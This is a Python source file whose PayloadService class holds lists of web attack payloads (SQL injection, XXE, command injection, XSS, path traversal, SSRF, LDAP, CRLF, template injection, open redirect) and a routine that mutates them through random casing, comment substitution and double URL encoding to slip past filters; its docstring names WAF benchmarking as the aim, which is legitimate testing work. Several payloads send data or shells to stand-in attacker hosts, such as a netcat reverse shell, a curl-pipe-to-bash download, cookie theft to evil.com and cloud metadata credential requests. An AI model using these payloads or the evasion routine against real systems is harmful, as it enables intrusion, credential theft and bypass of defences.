import random
import urllib.parse

class PayloadService:
    """Service to compile and mutate security audit payloads for WAF benchmarking and classification validation."""

    PAYLOAD_POOLS = {
        # 1. SQL Injection (Basic & Advanced)
        'basic': [
            "1' OR '1'='1",
            "admin' --",
            "' OR 1=1 --",
            "1' OR 1=1 LIMIT 1#",
            "' OR 'a'='a",
            "admin' OR 1=1#"
        ],
        'advanced': [
            "' UNION SELECT null, username, password FROM users --",
            "'; DROP TABLE audits; --",
            "1' AND sleep(5)#",
            "'; EXEC xp_cmdshell('dir');--",
            "1 AND (SELECT 2215 FROM(SELECT COUNT(*),CONCAT(0x7170,(SELECT (ELT(2215=2215,1))),0x7178,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",
            "1' AND 1=2 UNION SELECT NULL, version() --"
        ],

        # 2. Broken Access Control & Privilege Escalation
        'broken_access_control': [
            "admin=true&role=admin&user_id=1",
            "isAdmin=1&privilege=root&permission=grant",
            "user_id=1&account_id=1001&role=superuser",
            "auth_token=null&is_admin=true",
            "/api/v1/admin/users/export?tenant_id=1",
            "role=SystemAdministrator&group_id=0"
        ],

        # 3. XML / XXE Injection
        'xxe': [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<!DOCTYPE replace [<!ENTITY ent SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><msg>&ent;</msg>',
            '<!DOCTYPE test [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><test>&send;</test>',
            '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hosts"/></foo>'
        ],

        # 4. OS Command Injection
        'command_injection': [
            '; cat /etc/passwd | mail attacker@evil.com',
            '| whoami && id',
            '`ping -c 4 127.0.0.1`',
            '; nc -e /bin/bash 10.0.0.1 4444',
            '& dir C:\\Windows\\System32 & whoami',
            '$(curl -s http://attacker.com/shell.sh | bash)',
            '; python3 -c "import os; os.system(\'whoami\')"'
        ],

        # 5. Cross-Site Scripting (XSS)
        'xss': [
            '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',
            '<img src="x" onerror="alert(document.domain)">',
            '<svg onload="alert(\'XSS\')">',
            'javascript:fetch("http://evil.com/"+document.cookie)',
            '"><script>alert(1)</script>',
            '<body onload="window.location=\'http://attacker.com\'">',
            '<iframe src="javascript:alert(`Suraksha XSS`)"></iframe>'
        ],

        # 6. Path Traversal
        'path_traversal': [
            '../../../../etc/passwd',
            '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow',
            '../../../../var/log/apache2/access.log%00',
            '..%252f..%252f..%252fboot.ini',
            '../../../../proc/self/environ'
        ],

        # 7. Server-Side Request Forgery (SSRF)
        'ssrf': [
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
            'http://127.0.0.1:8080/admin/secrets',
            'gopher://127.0.0.1:6379/_SET%20key%20val',
            'http://192.168.1.1/router-login.asp',
            'file:///etc/passwd'
        ],

        # 8. LDAP Injection
        'ldap': [
            '*)(&(objectClass=*))',
            'admin*)(|(uid=*))',
            '*)(userPassword=*)',
            '(|(cn=*))(objectCategory=person)',
            'admin)(|(mail=*))',
            '*)(|(sAMAccountName=*))'
        ],

        # 9. HTTP Header Injection / CRLF
        'header_injection': [
            'victim\r\nSet-Cookie: session=attacker_controlled; Domain=.target.com',
            'test%0d%0aLocation:%20http://evil.com/phishing',
            'normal_user\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>',
            'valid\r\nHost: evil-cdn.com',
            'value\r\nX-Forwarded-For: 127.0.0.1'
        ],

        # 10. Server-Side Template Injection (SSTI)
        'template_injection': [
            '{{7*7}}',
            '{{config.__class__.__init__.__globals__["os"].popen("id").read()}}',
            '${7*7}',
            '#{ 7 * 7 }',
            '{{ "".__class__.__mro__[1].__subclasses__() }}',
            '{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__["__import__"]("os").popen("whoami").read()}}{% endif %}{% endfor %}'
        ],

        # 11. Open Redirect
        'open_redirect': [
            'redirect=https://evil.com/login-phish',
            'return_url=//attacker.com/malware',
            'next=javascript:alert(document.cookie)',
            'goto=https://victim.com@attacker.com',
            'url=http://phishing-gateway.com/verify'
        ]
    }

    @classmethod
    def generate_payload(cls, payload_type='basic', difficulty='low', mutation_level=0):
        """
        Generates and mutates a security payload based on category and mutation severity.
        """
        payload_type = str(payload_type).lower().strip()
        
        # Map aliases
        aliases = {
            'xss': 'xss',
            'cross-site scripting': 'xss',
            'command': 'command_injection',
            'cmd': 'command_injection',
            'command_injection': 'command_injection',
            'xxe': 'xxe',
            'xml': 'xxe',
            'xml / xxe injection': 'xxe',
            'traversal': 'path_traversal',
            'path_traversal': 'path_traversal',
            'path traversal': 'path_traversal',
            'bac': 'broken_access_control',
            'broken access control': 'broken_access_control',
            'broken_access_control': 'broken_access_control',
            'ssrf': 'ssrf',
            'ldap': 'ldap',
            'ldap injection': 'ldap',
            'header': 'header_injection',
            'header injection': 'header_injection',
            'ssti': 'template_injection',
            'template': 'template_injection',
            'template injection': 'template_injection',
            'template injection (ssti)': 'template_injection',
            'redirect': 'open_redirect',
            'open redirect': 'open_redirect',
            'open_redirect': 'open_redirect',
            'basic': 'basic',
            'advanced': 'advanced',
            'sqli': 'basic'
        }

        key = aliases.get(payload_type, payload_type)

        if key in cls.PAYLOAD_POOLS:
            pool = cls.PAYLOAD_POOLS[key]
        elif key in ['all', 'random']:
            all_list = []
            for plist in cls.PAYLOAD_POOLS.values():
                all_list.extend(plist)
            pool = all_list
        else:
            pool = cls.PAYLOAD_POOLS['basic']

        payload = random.choice(pool)
        mutation_level = int(mutation_level or 0)

        # Level 1: Random Character Casing
        if mutation_level >= 1:
            payload = "".join(
                char.upper() if random.random() > 0.5 else char.lower()
                for char in payload
            )

        # Level 2: Space / Delimiter Obfuscation
        if mutation_level >= 2:
            if "<" in payload or ">" in payload:
                payload = payload.replace(" ", "/**/") if " " in payload else payload.replace("<", "< ")
            elif "SELECT" in payload.upper() or "OR" in payload.upper():
                payload = payload.replace(" ", "/**/")
            else:
                payload = payload.replace(" ", "%20")

        # Level 3: URL Hex Encoding
        if mutation_level >= 3:
            payload = urllib.parse.quote(payload)

        # Level 4: Double URL Encoding
        if mutation_level >= 4:
            payload = urllib.parse.quote(payload)

        return payload
